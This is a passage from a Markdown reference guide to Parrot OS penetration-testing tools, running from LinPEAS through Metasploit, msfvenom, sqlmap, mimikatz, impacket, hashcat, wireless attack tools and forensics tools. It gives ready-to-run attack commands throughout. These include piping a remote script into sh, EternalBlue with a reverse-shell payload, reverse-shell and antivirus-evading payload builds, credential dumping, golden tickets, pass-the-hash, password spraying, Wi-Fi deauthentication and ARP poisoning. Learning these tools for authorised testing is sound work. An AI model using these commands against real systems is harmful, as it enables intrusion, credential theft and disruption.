PEASS (Privilege Escalation Awesome Scripts Suite) includes **LinPEAS** (Linux) and **WinPEAS** (Windows). These scripts automatically enumerate hundreds of potential privilege escalation vectors on compromised systems, color-coding results by severity.

```bash
# LinPEAS on compromised Linux system
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
# or from Parrot:
linpeas.sh | tee /tmp/linpeas_output.txt

# WinPEAS on compromised Windows system (via Meterpreter)
upload /usr/share/peass/winPEAS.exe C:\\Temp\\winpeas.exe
shell
C:\Temp\winpeas.exe
```

**What LinPEAS checks:**
- SUID/SGID files
- World-writable files
- Cron jobs with weak permissions
- Sudo misconfiguration
- Writable /etc/passwd
- Kernel exploits (suggests relevant CVEs)
- Docker/LXC container escapes
- Network connections and open ports

---

### 🔍 unix-privesc-check

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Vulnerability Analysis |
| **Type** | Unix Privilege Escalation Checker |
| **Skill Level** | Intermediate |

**Description:**  
A shell script that checks for simple privilege escalation vectors on Unix/Linux systems. Lighter than LinPEAS but useful for quick checks.

```bash
unix-privesc-check standard     # Standard check
unix-privesc-check detailed     # More detailed output
```

---

### 📡 tnscmd10g

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Vulnerability Analysis |
| **Type** | Oracle TNS Listener Tool |
| **Skill Level** | Intermediate |

**Description:**  
Tool for interacting with Oracle database TNS Listener service. Can extract version info, enumerate services, and test for misconfigurations in Oracle databases.

```bash
tnscmd10g version -h target.com   # Get Oracle version
tnscmd10g status -h target.com    # Get listener status
```

---

## 9. Pentesting — Web Application Analysis

---

### 🎯 Caido (Web)

Already documented in Most Used Tools section above.

---

### 🔍 parsero

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Web Application Analysis |
| **Type** | robots.txt Parser |
| **Skill Level** | Beginner |

**Description:**  
Parsero reads a website's robots.txt file and checks the disallowed entries to find hidden paths, admin panels, and sensitive directories that the site owner tried to hide from search engines.

```bash
parsero -u http://target.com          # Parse robots.txt
parsero -u http://target.com -sb      # Check if disallowed URLs return 200 OK
```

---

### ☁️ s3scanner

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Web Application Analysis |
| **Type** | AWS S3 Bucket Scanner |
| **Skill Level** | Intermediate |

**Description:**  
S3scanner scans for misconfigured Amazon S3 buckets, finding publicly accessible buckets that may contain sensitive data like backups, credentials, source code, and user data.

```bash
s3scanner scan --bucket-file buckets.txt    # Scan list of bucket names
s3scanner scan --bucket company-name        # Check specific bucket
```

---

### 🐟 skipfish

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Web Application Analysis |
| **Type** | Web Application Security Recon Tool |
| **Skill Level** | Intermediate |

**Description:**  
Skipfish is an active web application security reconnaissance tool developed by Google. It performs a comprehensive crawl of a website and builds a security assessment report.

```bash
skipfish -o /tmp/output http://target.com    # Basic scan
skipfish -W /usr/share/skipfish/dictionaries/complete.wl -o /tmp/output http://target.com
```

---

### 🔍 wig

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Web Application Analysis |
| **Type** | Web Application Information Gatherer |
| **Skill Level** | Beginner |

**Description:**  
WIG (Web Information Gatherer) identifies web application frameworks, CMS platforms, programming languages, and server technologies used by a website.

```bash
wig http://target.com              # Identify web technologies
wig -a http://target.com           # Comprehensive scan
```

---

## 10. Pentesting — Exploitation Tools

---

### 💀 Metasploit Framework

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Exploitation |
| **Type** | Exploitation Framework |
| **Skill Level** | Intermediate–Advanced |

**Description:**  
Metasploit is the world's most widely used penetration testing framework with thousands of exploits, payloads, auxiliary modules, and post-exploitation tools. It's the backbone of most professional penetration tests.

```bash
sudo service postgresql start         # Start database (required)
sudo msfdb init                       # Initialize Metasploit database
msfconsole                            # Launch Metasploit console

# Inside msfconsole:
help                                  # Show help
search eternalblue                    # Search for exploit
use exploit/windows/smb/ms17_010_eternalblue  # Select exploit
show options                          # View required options
set RHOSTS 192.168.1.100              # Set target IP
set LHOST 192.168.1.50                # Set attacker IP
set PAYLOAD windows/x64/meterpreter/reverse_tcp  # Set payload
run                                   # Execute the exploit
exploit                               # Alternative to run

# Database commands
workspace -a target_name              # Create new workspace
db_nmap -A 192.168.1.0/24            # Nmap scan into database
hosts                                 # View discovered hosts
services                              # View discovered services
vulns                                 # View found vulnerabilities
```

**Meterpreter (Advanced Shell) Commands:**
```bash
sysinfo                    # System information
getuid                     # Current user
getsystem                  # Attempt privilege escalation
hashdump                   # Dump password hashes
ps                         # List running processes
migrate PID                # Migrate to another process
upload local.file C:\\target\\path  # Upload file
download C:\\file /local/path       # Download file
shell                      # Drop to system shell
screenshot                 # Take screenshot
keyscan_start              # Start keylogger
keyscan_dump               # Dump keystrokes
run post/multi/recon/local_exploit_suggester  # Suggest privesc
portfwd add -l 3389 -p 3389 -r 192.168.1.100  # Port forward
```

---

### 💉 msfvenom

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Exploitation → Payload Generators |
| **Type** | Payload Generator and Encoder |
| **Skill Level** | Intermediate |

**Description:**  
MSFvenom is Metasploit's standalone payload generator. It creates shellcode, executables, scripts, and other payloads in dozens of formats that can be used to gain reverse shells when executed on a target.

```bash
# List all payloads
msfvenom -l payloads

# Windows reverse shell executable
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f exe -o shell.exe

# Linux reverse shell ELF
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f elf -o shell.elf

# PHP web shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f raw -o shell.php

# Python payload
msfvenom -p python/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f raw -o shell.py

# Android APK
msfvenom -p android/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -o shell.apk

# Encode payload to evade AV
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -e x64/xor_dynamic -i 10 -f exe -o encoded_shell.exe
```

---

### 💉 SQLmap

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Exploitation |
| **Type** | SQL Injection Automation Tool |
| **Skill Level** | Beginner–Intermediate |

**Description:**  
SQLmap is the most powerful open-source SQL injection detection and exploitation tool. It automates the entire process of finding and exploiting SQL injection flaws, including database fingerprinting, data extraction, file read/write, and OS command execution.

```bash
# Basic scan
sqlmap -u "http://target.com/page?id=1"

# POST request
sqlmap -u "http://target.com/login" --data="user=admin&pass=test"

# With cookies (authenticated session)
sqlmap -u "http://target.com/dashboard" --cookie="session=abc123"

# Enumerate databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Enumerate tables in a database
sqlmap -u "http://target.com/page?id=1" -D database_name --tables

# Dump table contents
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump

# Get OS shell (if high privilege)
sqlmap -u "http://target.com/page?id=1" --os-shell

# Read a file
sqlmap -u "http://target.com/page?id=1" --file-read="/etc/passwd"

# Speed and evasion flags
# --level=5 --risk=3  — Maximum detection
# --tamper=space2comment  — Evade WAF
# --tor  — Route through Tor
# --batch  — Non-interactive mode
```

---

### 🔗 netexec (formerly CrackMapExec)

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Exploitation |
| **Type** | Windows/Active Directory Network Tool |
| **Skill Level** | Advanced |

**Description:**  
NetExec is the actively maintained successor to CrackMapExec. It automates assessments of large Active Directory networks — testing credentials across hundreds of hosts simultaneously, enumerating shares, executing commands, and dumping credentials.

```bash
# Test credentials against SMB
netexec smb 192.168.1.0/24 -u Administrator -p Password123

# Enumerate shares
netexec smb target.com -u user -p pass --shares

# Dump SAM database
netexec smb target.com -u Administrator -p pass --sam

# Spray passwords (Password Spraying)
netexec smb 192.168.1.0/24 -u users.txt -p 'Welcome123' --continue-on-success

# Execute commands
netexec smb target.com -u admin -p pass -x "whoami"

# WinRM (Windows Remote Management)
netexec winrm target.com -u admin -p pass -x "whoami"
```

---

### 💻 websploit

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Exploitation |
| **Type** | Web/Network Attack Framework |
| **Skill Level** | Intermediate |

**Description:**  
WebSploit is an open-source framework for scanning and exploiting web applications and network vulnerabilities, with modules for various attack types including Man-in-the-Middle, Wi-Fi attacks, and web exploitation.

```bash
websploit                    # Launch WebSploit
show modules                  # List all available modules
use web/sql_injector          # Use SQL injection module
show options                  # Show module options
run                           # Execute attack
```

---

### 🔐 jsql-injection (jsql)

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Exploitation → Database |
| **Type** | SQL Injection Tool (Java-based GUI) |
| **Skill Level** | Beginner–Intermediate |

**Description:**  
jSQL Injection is a Java-based GUI SQL injection tool. Provides a point-and-click interface for detecting and exploiting SQL injection vulnerabilities with support for MySQL, PostgreSQL, MSSQL, SQLite, and more.

---

### 💣 pompem

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Exploitation → Exploit Search |
| **Type** | Exploit Search Engine Tool |
| **Skill Level** | Beginner |

**Description:**  
Pompem is an automatic exploit finder that searches exploit databases (Exploit-DB, Packet Storm, National Vulnerability Database) and returns relevant exploits for specified software or CVEs.

```bash
pompem --search "Apache 2.4"         # Search for Apache exploits
pompem --search "vsftpd 2.3.4"       # Search for specific software
```

---

### 🌐 IPv6 Attack Tools

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Exploitation → IPv6 Tools |
| **Type** | IPv6 Network Attack Suite |
| **Skill Level** | Advanced |

**Description:**  
Parrot includes a comprehensive suite of IPv6 attack tools (part of the THC-IPv6 toolkit). Many networks have IPv6 enabled but poorly secured, making these tools valuable for testing IPv6 attack surfaces.

```bash
# Key tools and their purposes:
fake_router6 eth0           # Send fake router advertisements (MITM)
denial6 eth0 target_ip6     # DoS attack against IPv6 host
flood_router6 eth0          # Flood network with router advertisements
fake_dns6d eth0 target_ip6  # DNS spoofing over IPv6
detect-new-ip6 eth0         # Detect when new IPv6 devices join network
dnsdict6 -d target.com      # IPv6 DNS enumeration
dos-new-ip6 eth0            # DoS new IPv6 hosts as they connect
```

---

## 11. Pentesting — Maintaining Access

---

### 🩸 bloodhound

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Maintaining Access |
| **Type** | Active Directory Attack Path Mapper |
| **Skill Level** | Advanced |

**Description:**  
BloodHound uses graph theory to reveal hidden attack paths in Active Directory environments. It ingests data collected from a target AD environment and maps relationships, showing the shortest path from any compromised user to Domain Admin.

```bash
# Start BloodHound (requires neo4j database)
sudo neo4j console &
bloodhound

# Collect AD data with SharpHound (on Windows target)
# Then import the ZIP file into BloodHound GUI

# Key queries in BloodHound:
# "Find Shortest Paths to Domain Admins"
# "Find All Paths from Here to Domain Admins"
# "List All Kerberoastable Accounts"
# "Find Computers with Unconstrained Delegation"
```

---

### 🎯 Sliver C2

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Maintaining Access |
| **Type** | Command & Control (C2) Framework |
| **Skill Level** | Advanced |

**Description:**  
Sliver is a modern, open-source C2 framework designed for red team operations. It supports multiple protocols (HTTP/HTTPS, DNS, mTLS, WireGuard) and generates implants for Windows, Linux, and macOS. A powerful alternative to Cobalt Strike.

```bash
sliver-server              # Start Sliver C2 server
sliver-client              # Connect as operator

# Inside Sliver server:
generate --http target.com --os windows --arch amd64 --save /tmp/implant.exe
http                       # Start HTTP listener
https                      # Start HTTPS listener
sessions                   # List active sessions
use SESSION_ID             # Interact with session
```

---

### 🌐 proxychains4

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Maintaining Access |
| **Type** | Traffic Proxy Chain Tool |
| **Skill Level** | Intermediate |

**Description:**  
Proxychains4 forces any TCP connection from any tool through one or more SOCKS/HTTP proxies. Used to route attack tools through Tor, bounce through compromised hosts, or chain multiple proxies for anonymization.

```bash
# Configuration: /etc/proxychains4.conf
# Add your proxy chain at the bottom:
# socks5 127.0.0.1 9050  (Tor)
# socks4 proxy.example.com 1080

proxychains4 nmap -sT target.com          # Nmap through proxy
proxychains4 sqlmap -u http://target.com  # SQLmap through proxy
proxychains4 firefox                       # Firefox through proxy
proxychains4 ssh user@target.com          # SSH through proxy
```

---

### ⭐ starkiller

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Maintaining Access |
| **Type** | PowerShell Empire Web GUI |
| **Skill Level** | Advanced |

**Description:**  
Starkiller is the web-based GUI frontend for PowerShell Empire C2 framework. Empire uses PowerShell agents on Windows and Python agents on Linux/macOS for post-exploitation operations.

---

## 12. Pentesting — Post Exploitation

---

### 🔑 mimikatz

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Post Exploitation |
| **Type** | Windows Credential Dumper |
| **Skill Level** | Advanced |

**Description:**  
Mimikatz is the most famous Windows credential dumping tool. It can extract plaintext passwords, NTLM hashes, Kerberos tickets, and more from Windows memory (LSASS process). Essential for Windows penetration testing.

```bash
# Via Metasploit Meterpreter (kiwi module):
meterpreter> load kiwi
meterpreter> creds_all            # Dump all credentials
meterpreter> lsa_dump_sam         # Dump SAM database
meterpreter> lsa_dump_secrets     # Dump LSA secrets

# Standalone Windows commands (on target):
privilege::debug                  # Request debug privilege
sekurlsa::logonpasswords          # Dump plaintext passwords from LSASS
sekurlsa::wdigest                 # Extract WDigest credentials
lsadump::sam                      # Dump SAM database
lsadump::lsa /patch               # Dump LSA secrets
kerberos::list                    # List Kerberos tickets
kerberos::golden /user:Administrator /domain:target.local /sid:S-1-5-... /krbtgt:hash  # Golden Ticket
```

---

### 🔑 kerberoast

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Post Exploitation |
| **Type** | Kerberos Attack Tool |
| **Skill Level** | Advanced |

**Description:**  
Kerberoasting is an Active Directory attack that extracts service account credential hashes from Kerberos tickets. Any domain user can request service tickets for accounts with SPNs, then crack the tickets offline.

```bash
# From Linux using impacket
GetUserSPNs.py domain.local/user:password -dc-ip 192.168.1.1 -request

# Save hashes to file for cracking
GetUserSPNs.py domain.local/user:password -dc-ip 192.168.1.1 -request -outputfile hashes.txt

# Crack with hashcat
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
```

---

### 🔒 powersploit

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Post Exploitation |
| **Type** | PowerShell Post-Exploitation Framework |
| **Skill Level** | Advanced |

**Description:**  
PowerSploit is a collection of PowerShell modules for post-exploitation operations — privilege escalation, persistence, reconnaissance, code execution, and exfiltration — all using PowerShell to blend in with normal Windows operations.

```powershell
# Import module (on compromised Windows system)
Import-Module PowerSploit

# Recon
Get-NetDomainController        # Find domain controllers
Get-NetUser                    # Enumerate users
Get-NetShare                   # Find accessible shares

# Privilege escalation
Invoke-AllChecks               # Check for privesc opportunities

# Persistence
Add-Persistence -Trigger Startup -Payload Meterpreter  # Add startup persistence
```

---

## 13. Pentesting — Password Attacks

---

### 🔨 hashcat

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Password Attacks |
| **Type** | GPU-accelerated Hash Cracker |
| **Skill Level** | Intermediate |

**Description:**  
Hashcat is the world's fastest password recovery utility, leveraging GPU acceleration to crack billions of password hashes per second. Supports 300+ hash types including MD5, SHA1, SHA256, NTLM, bcrypt, WPA, and more.

```bash
# Identify hash type
hashid hash.txt
hash-identifier

# Dictionary attack
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt      # MD5
hashcat -m 1000 hash.txt rockyou.txt                         # NTLM
hashcat -m 1800 hash.txt rockyou.txt                         # SHA-512crypt (Linux)
hashcat -m 13100 hash.txt rockyou.txt                        # Kerberos 5 TGS

# Brute force
hashcat -m 0 hash.txt -a 3 ?a?a?a?a?a?a?a?a                # 8-char all chars
hashcat -m 0 hash.txt -a 3 ?u?l?l?l?d?d?d?d               # Pattern: Capital+lower+digits

# Rule-based attack (best for real passwords)
hashcat -m 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Combinator attack
hashcat -m 0 hash.txt -a 1 wordlist1.txt wordlist2.txt

# Common hash types (-m value):
# 0     = MD5
# 100   = SHA1
# 1000  = NTLM
# 1400  = SHA-256
# 1800  = SHA-512crypt
# 3200  = bcrypt
# 13100 = Kerberos 5 TGS
# 22000 = WPA-PBKDF2-PMKID+EAPOL
```

---

### 🔨 John the Ripper

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Password Attacks |
| **Type** | Password Cracker |
| **Skill Level** | Beginner–Intermediate |

**Description:**  
John the Ripper (JtR) is the classic CPU-based password cracker. It auto-detects hash types, has built-in wordlists, and includes powerful mangling rules. Great for Linux/Unix shadow files, ZIP archives, SSH keys, and more.

```bash
# Auto-detect and crack
john hashes.txt

# With wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# With rules (transforms wordlist: leetspeak, capitalization, etc.)
john --wordlist=rockyou.txt --rules hashes.txt

# Show cracked passwords
john --show hashes.txt

# Crack /etc/shadow file
unshadow /etc/passwd /etc/shadow > unshadowed.txt
john unshadowed.txt

# Crack ZIP password
zip2john protected.zip > zip.hash
john zip.hash

# Crack SSH private key
ssh2john id_rsa > ssh.hash
john ssh.hash --wordlist=rockyou.txt

# Crack PDF password
pdf2john protected.pdf > pdf.hash
john pdf.hash
```

---

### 🔑 hashid / hash-identifier

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Password Attacks |
| **Type** | Hash Type Identifier |
| **Skill Level** | Beginner |

**Description:**  
Identifies hash types from their format and length. Essential first step before cracking — you need to know what algorithm produced a hash to crack it correctly.

```bash
hashid 5f4dcc3b5aa765d61d8327deb882cf99    # Identify single hash
hashid -f hashes.txt                         # Identify hashes from file
hashid -m 5f4dcc3b5aa765d61d8327deb882cf99  # Show hashcat mode number
```

---

### 💧 THC Hydra

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Password Attacks → Online |
| **Type** | Online Password Brute-forcer |
| **Skill Level** | Intermediate |

**Description:**  
Hydra is the fastest and most flexible online password brute-forcing tool. It supports 50+ protocols including SSH, FTP, HTTP, HTTPS, SMB, RDP, SMTP, MySQL, and more.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com
hydra -L users.txt -P passwords.txt ftp://target.com
hydra -l admin -P rockyou.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
hydra -l admin -P rockyou.txt rdp://target.com
hydra -l admin -P rockyou.txt smb://target.com
hydra -t 4 -l admin -P rockyou.txt target.com ssh  # 4 threads for SSH (avoid lockout)
```

---

### 🌈 rcrack / rcracki_mt

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Password Attacks |
| **Type** | Rainbow Table Cracker |
| **Skill Level** | Intermediate |

**Description:**  
RCrack and RCracki_mt crack hashes using precomputed rainbow tables. Rainbow tables trade disk space for cracking speed — you precompute billions of hash-to-password mappings so cracking is nearly instant.

```bash
rcrack /path/to/tables/*.rt -h 5f4dcc3b5aa765d61d8327deb882cf99   # Single hash
rcrack /path/to/tables/*.rt -l hashes.txt                           # Hash list
rcracki_mt /path/to/tables/*.rti -h HASH                            # Multi-threaded
```

---

## 14. Pentesting — Wireless Testing

---

### 📡 airgeddon

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Wireless Testing |
| **Type** | Automated Wi-Fi Attack Script |
| **Skill Level** | Beginner–Intermediate |

**Description:**  
Airgeddon is a bash script that wraps all common Wi-Fi attack tools into an interactive menu. It handles all the setup complexity of putting interfaces into monitor mode, deauthenticating clients, capturing handshakes, and cracking them — with a user-friendly menu.

```bash
sudo airgeddon            # Launch (requires root)
# Follow the interactive menu:
# 1. Select interface
# 2. Put into monitor mode
# 3. Choose attack type (WPA handshake, PMKID, WPS, Evil Twin, etc.)
```

**Attack Types Supported:**
- WPA/WPA2 handshake capture and offline cracking
- PMKID attack (no clients needed)
- WPS PIN attack (Pixie Dust, brute force)
- Evil Twin / Rogue AP attacks
- DoS/Deauthentication attacks
- WEP attacks

---

### 📶 fern wifi cracker

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Wireless Testing |
| **Type** | GUI Wi-Fi Security Auditing Tool |
| **Skill Level** | Beginner |

**Description:**  
Fern Wifi Cracker is a Python/PyQt GUI tool for Wi-Fi security testing. Supports WEP, WPA/WPA2, and WPS attacks with a completely graphical interface — ideal for beginners who aren't comfortable with the command line.

```bash
fern-wifi-cracker          # Launch GUI
```

---

### 💥 mdk3 / mdk4

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Wireless Testing |
| **Type** | Wi-Fi Denial of Service Tool |
| **Skill Level** | Intermediate |

**Description:**  
MDK3/4 is a proof-of-concept tool for testing Wi-Fi network resilience against various attack types including beacon flooding, deauthentication storms, SSID brute forcing, and more.

```bash
mdk3 wlan0mon b            # Beacon flood mode (fake APs)
mdk3 wlan0mon d            # Deauthentication/disassociation attack
mdk3 wlan0mon a            # Authenticate flooding
mdk3 wlan0mon p -t TARGET_BSSID   # Probe request fuzzing
```

---

### 🎯 pixiewps

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Wireless Testing |
| **Type** | WPS Pixie Dust Attack Tool |
| **Skill Level** | Intermediate |

**Description:**  
Pixiewps exploits the "Pixie Dust" vulnerability in WPS implementations on many routers. This vulnerability allows recovering the WPS PIN (and thus the Wi-Fi password) in seconds without brute-forcing.

```bash
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1    # Pixie Dust attack via reaver
pixiewps -e PKE -r PKR -s E-Hash1 -z E-Hash2 -a AuthKey -n E-Nonce  # Direct use
```

---

### 🔓 reaver

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Wireless Testing |
| **Type** | WPS PIN Brute-forcer |
| **Skill Level** | Intermediate |

**Description:**  
Reaver brute-forces WPS PINs to recover WPA/WPA2 passphrases. WPS PINs are only 8 digits (effectively 11,000 combinations due to a design flaw), making them vulnerable to brute force.

```bash
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv     # Basic WPS attack
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vv  # Pixie Dust first
reaver -i wlan0mon -b TARGET_BSSID -c 6 -d 15   # With delay to avoid lockout
```

---

### 📶 wifite

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Wireless Testing |
| **Type** | Automated Wireless Attack Tool |
| **Skill Level** | Beginner |

**Description:**  
Wifite is a Python script that automates wireless network auditing. It scans for networks, selects targets, and automatically attempts the most effective attacks (PMKID, WPA handshake, WPS, WEP) with minimal user interaction.

```bash
sudo wifite                  # Scan and attack all visible networks
sudo wifite --wpa            # Target only WPA networks
sudo wifite --bssid AA:BB:CC:DD:EE:FF  # Target specific AP
sudo wifite --wordlist /usr/share/wordlists/rockyou.txt  # Use custom wordlist
sudo wifite --wps            # Target WPS-enabled networks only
```

---

## 15. Pentesting — Sniffing & Spoofing

---

### 🐱 ettercap-graphical

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Sniffing & Spoofing |
| **Type** | Man-in-the-Middle Attack Tool |
| **Skill Level** | Intermediate |

**Description:**  
Ettercap is a comprehensive suite for man-in-the-middle attacks on LAN networks. It supports ARP poisoning, DNS spoofing, SSL stripping, and packet capture/filtering. The graphical version provides a GUI interface.

```bash
ettercap -G                              # Launch GUI
ettercap -T -i eth0 -M arp:remote /target/ /gateway/  # CLI ARP poisoning
```

---

### 🕸️ etherape

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Sniffing & Spoofing |
| **Type** | Visual Network Monitor |
| **Skill Level** | Beginner |

**Description:**  
EtherApe is a graphical network monitor that displays network activity in real-time as an animated graph. Nodes represent hosts; links represent active connections. Different colors indicate different protocols. Excellent for visualizing network topology.

```bash
sudo etherape                    # Launch (requires root for raw capture)
sudo etherape -i eth0            # Monitor specific interface
```

---

### 🕸️ hamster

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Sniffing & Spoofing |
| **Type** | Session Hijacking Tool |
| **Skill Level** | Advanced |

**Description:**  
Hamster is a session hijacking tool that works with Ferret to steal web session cookies from network traffic, allowing an attacker to take over authenticated web sessions.

```bash
ferret -i eth0              # Capture session cookies
hamster                      # Start hamster proxy on port 1234
# Configure browser to use proxy 127.0.0.1:1234
# Browse to http://hamster/ to see stolen sessions
```

---

### 🐍 impacket

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Sniffing & Spoofing / Post Exploitation |
| **Type** | Python Network Protocol Library |
| **Skill Level** | Advanced |

**Description:**  
Impacket is a collection of Python classes for working with network protocols. It includes tools for SMB, Kerberos, LDAP, DCOM, and more — essential for Windows/Active Directory attacks.

```bash
# Execute commands remotely
psexec.py domain/user:password@target.com
wmiexec.py domain/user:password@target.com 'whoami'
smbexec.py domain/user:password@target.com

# Pass the Hash
psexec.py -hashes :NTLM_HASH Administrator@target.com

# Dump credentials
secretsdump.py domain/user:password@target.com

# Kerberos attacks
GetUserSPNs.py domain.local/user:password -dc-ip dc_ip -request
GetNPUsers.py domain.local/ -usersfile users.txt -no-pass       # AS-REP Roasting
ticketer.py -nthash krbtgt_hash -domain-sid DOMAIN_SID -domain domain.local Administrator

# Relay attacks
ntlmrelayx.py -t smb://target -smb2support
```

---

### 🔀 macchanger

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Sniffing & Spoofing |
| **Type** | MAC Address Changer |
| **Skill Level** | Beginner |

**Description:**  
Macchanger changes your network interface's MAC address. Used to bypass MAC filtering on Wi-Fi networks, maintain anonymity, and avoid network-based tracking.

```bash
sudo macchanger -r eth0              # Random MAC address
sudo macchanger -m AA:BB:CC:DD:EE:FF eth0  # Specific MAC
sudo macchanger -p eth0              # Reset to permanent hardware MAC
sudo macchanger -s eth0              # Show current MAC
```

---

### 🔗 mitmproxy

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Sniffing & Spoofing |
| **Type** | Interactive HTTPS Proxy |
| **Skill Level** | Intermediate |

**Description:**  
Mitmproxy is an interactive SSL-capable intercepting HTTP proxy. Unlike Burp Suite, it runs in the terminal and is highly scriptable in Python, making it ideal for automation and custom interception logic.

```bash
mitmproxy                    # Interactive TUI proxy
mitmweb                      # Web UI version
mitmdump                     # Non-interactive, log to stdout

# With script
mitmproxy -s my_script.py

# Transparent proxy mode
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
mitmproxy --mode transparent
```

---

### 🔔 responder

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Sniffing & Spoofing |
| **Type** | LLMNR/NBT-NS/mDNS Poisoner |
| **Skill Level** | Intermediate–Advanced |

**Description:**  
Responder poisons LLMNR, NBT-NS, and mDNS name resolution broadcasts on Windows networks to capture NTLMv1/v2 hashes. When a Windows host can't resolve a name via DNS, it broadcasts — Responder responds and captures the authentication attempt.

```bash
sudo responder -I eth0               # Listen on eth0
sudo responder -I eth0 -w -d        # With WPAD and DHCP
sudo responder -I eth0 --lm         # Downgrade to LM hashes

# Captured hashes saved to /usr/share/responder/logs/
# Crack with hashcat:
hashcat -m 5600 hashes.txt rockyou.txt  # NTLMv2
```

---

### 🐍 scapy

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Sniffing & Spoofing |
| **Type** | Packet Manipulation Framework |
| **Skill Level** | Advanced |

**Description:**  
Scapy is a powerful Python-based packet manipulation tool. It can forge or decode packets of a wide number of protocols, send, sniff, dissect, and match packets. Excellent for custom network attacks and protocol testing.

```python
# Example: ARP spoofing with Scapy
from scapy.all import *

# Craft custom TCP SYN packet
packet = IP(dst="target.com")/TCP(dport=80, flags="S")
send(packet)

# ARP spoof
arp = ARP(pdst="192.168.1.1", hwdst="ff:ff:ff:ff:ff:ff")
send(arp)

# Sniff packets
sniff(iface="eth0", filter="tcp port 80", prn=lambda x: x.show())
```

```bash
scapy        # Interactive Python shell with Scapy pre-loaded
```

---

## 16. Pentesting — Digital Forensics (Updated)

> Collect, preserve, and analyze digital evidence following proper forensic procedures.

---

### 🔬 autopsy

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Digital Forensics |
| **Type** | GUI Digital Forensics Platform |
| **Skill Level** | Intermediate |

**Description:**
Autopsy is an open-source, Java-based digital forensics platform and the GUI frontend for The Sleuth Kit. It lets investigators analyze disk images, recover deleted files, build timelines, examine web history, and generate professional reports — all from a browser-based interface.

```bash
autopsy          # Launch (opens browser at http://localhost:9999/autopsy)
```

**Workflow:**
```
1. Create a new case (File > New Case)
2. Add a data source (disk image, local disk, or logical files)
3. Select ingest modules (hash lookup, file type ID, keyword search, etc.)
4. Wait for ingest to complete
5. Browse results by category: Deleted Files, Web History, Emails, EXIF data
6. Generate HTML/Excel/PDF report
```

**Key Modules:**
| Module | Purpose |
|--------|---------|
| Hash Lookup | Flag known bad files (NSRL, custom hashsets) |
| Keyword Search | Find strings, regex patterns, credit cards |
| Web Artifacts | Browser history, cookies, downloads |
| Recent Activity | User activity, installed programs, OS info |
| Email Parser | Extract emails from PST/MBOX files |
| EXIF Parser | GPS and metadata from photos |

---

### 📦 binwalk

| Field | Details |
|-------|---------|
| **Category** | Pentesting → Digital Forensics |
| **Type** | Firmware Analysis & Extraction Tool |
| **Skill Level** | Intermediate |

**Description:**
Binwalk analyzes binary files to identify and extract embedded file signatures, compressed archives, file systems, and executable code. Originally designed for router firmware, it's invaluable for IoT device security research and embedded systems analysis.

```bash
binwalk firmware.bin                  # Identify embedded files/signatures
binwalk -e firmware.bin               # Extract everything automatically
binwalk -M firmware.bin               # Recursive extraction (matryoshka)
binwalk -A firmware.bin               # Scan for CPU architecture opcodes
binwalk -B firmware.bin               # Identify file types by entropy
binwalk --entropy firmware.bin        # Plot entropy graph (detects encryption)
binwalk -D 'png image:png' fw.bin     # Extract only specific file types
```

**Common Use Cases:**
- Extract web interfaces from router firmware
- Find hardcoded passwords and keys in firmware
- Identify encryption (high entropy regions)
- Extract Linux file systems from embedded devices
